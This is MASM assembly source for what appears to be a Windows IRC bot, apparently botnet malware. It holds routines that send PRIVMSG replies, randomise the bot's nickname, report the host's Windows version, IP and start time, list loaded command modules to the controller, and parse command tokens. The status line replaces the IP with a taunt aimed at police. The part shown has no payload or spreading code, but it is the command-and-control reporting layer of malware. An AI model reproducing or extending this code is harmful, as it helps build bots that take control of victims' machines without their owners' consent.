;-----------------------------------------------------------------------
get_local_address   proto
get_token           proto :dword, :dword, :byte, :dword, :byte

;-----------------------------------------------------------------------
.const
;-----------------------------------------------------------------------
    szOS0   byte 'NT', 0
    szOS1   byte '95', 0
    szOS2   byte '98', 0
    szOS3   byte 'ME', 0
    szOS4   byte '2000', 0
    szOS5   byte 'XP', 0
    szOS6   byte '2003', 0

;-----------------------------------------------------------------------
.code
;-----------------------------------------------------------------------
send_msg    proc    dwsocket, lpszuser, lpszmessage
    local   szmsgbuffer[1024]:byte
    pushad

    invoke  wsprintf, addr szmsgbuffer, SADD('PRIVMSG %s :%s', EOL), lpszuser, lpszmessage
    invoke  printf, SADD("%s"), addr szmsgbuffer
    invoke  send, dwsocket, addr szmsgbuffer, FUNC(lstrlen, addr szmsgbuffer), 0
    
    popad
    ret
send_msg    endp

;-----------------------------------------------------------------------
rand_nick   proc    lpszbuffer1
    local   szdwapped[16]:byte
    pushad
    invoke  GetTickCount
    adc     eax, edx
    rol     eax, 7
    add     edx, eax

    invoke  dwtoa, edx, addr szdwapped
    invoke  lstrlen, lpszbuffer1
    .if     eax >= sizeof bot_info.szusername
        mov     eax, lpszbuffer1
        sub     eax, 10
    .else
        mov     eax, lpszbuffer1
    .endif
    mov     edx, eax
    invoke  lstrcat, edx, addr szdwapped
    popad
    ret
rand_nick   endp
        
;-----------------------------------------------------------------------
get_local_address  proc
    local   localhost[261]:byte

    invoke  gethostname, addr localhost, sizeof localhost
    invoke  gethostbyname, addr localhost
    
    mov     eax, (hostent ptr [eax]).h_list
    mov     eax, [eax]
    mov     eax, [eax]
    
    invoke  inet_ntoa, eax
    ret
get_local_address endp

;-----------------------------------------------------------------------
print_status    proc    lpszbuffer1, lpbotinfo
    local   sOSInfo:OSVERSIONINFO, ospt

    mov     sOSInfo.dwOSVersionInfoSize, sizeof OSVERSIONINFO

    invoke  GetVersionEx, addr sOSInfo
    .if     sOSInfo.dwMajorVersion == 3

        mov     ospt, offset szOS0
    
    .elseif     sOSInfo.dwMajorVersion == 4
    
        .if     sOSInfo.dwMinorVersion == 10
            mov ospt, offset szOS2
        
        .elseif sOSInfo.dwMinorVersion == 90
            mov ospt, offset szOS3
        
        .elseif sOSInfo.dwPlatformId == 2
            mov ospt, offset szOS0
        
        .else
            mov ospt, offset szOS1
        .endif

    .elseif sOSInfo.dwMajorVersion == 5

        .if sOSInfo.dwMinorVersion == 0
            mov ospt, offset szOS4
    
        .else
            mov ospt, offset szOS5
        .endif
    .else
        mov ospt, offset szOS6
    .endif

    mov     eax, lpbotinfo
    movzx   esi, (sbot_data ptr [eax]).sSystemTime.wYear
    movzx   ebx, (sbot_data ptr [eax]).sSystemTime.wDay
    movzx   edi, (sbot_data ptr [eax]).sSystemTime.wMonth

    invoke  get_local_address
    mov     ecx, eax

    invoke wsprintf, lpszbuffer1, SADD("Version: %s - IP: %s - OS: Windows %s - Started: %d/%d/%d", EOL), SADD(BOT_VERSION), SADD("fuck.the.poli.ce"), ospt, edi, ebx, esi
    
    ret
print_status    endp

;-----------------------------------------------------------------------
print_modules   proc    dwsocket, lpszreply, lpbotinfo
    local   szbuffer[1024]:byte, dwindex[8]:byte, dwcount

    mov     ebx, lpbotinfo
    .if     dword ptr (sbot_data ptr [ebx]).modules[0].handle
        lea     ebx, (sbot_data ptr [ebx]).modules

        invoke  send_msg, dwsocket, lpszreply, SADD("[+] Module listing:", EOL)
        
        and     dwcount, 0
        .while  dword ptr (smodules ptr [ebx]).handle
            
            .if dword ptr (smodules ptr [ebx]).handle != -1
            
                mov     esi, (smodules ptr [ebx]).lpmdt
                
                inc     dwcount
                invoke  dwtoa, dwcount, addr dwindex

                invoke  wsprintf, addr szbuffer, SADD("[%s] Module name: %s - version: %s - Command: %s", EOL), addr dwindex, addr (MODULE_DESCRYPTION_TABLE ptr [esi]).szmodule, addr (MODULE_DESCRYPTION_TABLE ptr [esi]).szversion, addr (MODULE_DESCRYPTION_TABLE ptr [esi]).scommands.szcommand
                invoke  send_msg, dwsocket, lpszreply, addr szbuffer
                
                invoke  Sleep, 1000
                inc     dwindex
            
            .endif
            add     ebx, sizeof smodules

        .endw
        invoke  send_msg, dwsocket, lpszreply, SADD("[-] Module listing end.", EOL)
        
    .else
        invoke  send_msg, dwsocket, lpszreply, SADD("[-] No modules loaded.", EOL)
        
    .endif
    ret
print_modules   endp
    
;-----------------------------------------------------------------------
; Copiamos en lpdwbuffer el token de la cadena lpdwstring en el indice dwindex, separado por bseparator
get_token   proc    lpdwbuffer, lpdwstring, bseparator:byte, dwindex, bGetAll:byte
    mov     ecx, 0
    mov     esi, lpdwstring
    mov     edi, lpdwbuffer

    .while  (1)
        lodsb
        .if     !al || ecx > dwindex
            xor     eax, eax
            stosb
            .break
        
        .elseif al == bseparator
            .if     bGetAll == FALSE
                inc     ecx
            .else
                .if     ecx < dwindex
                    inc ecx
                .else
                    stosb
                .endif
            .endif
        
        .elseif ecx == dwindex
            stosb

        .endif
    .endw

    ret
get_token endp
;-----------------------------------------------------------------------
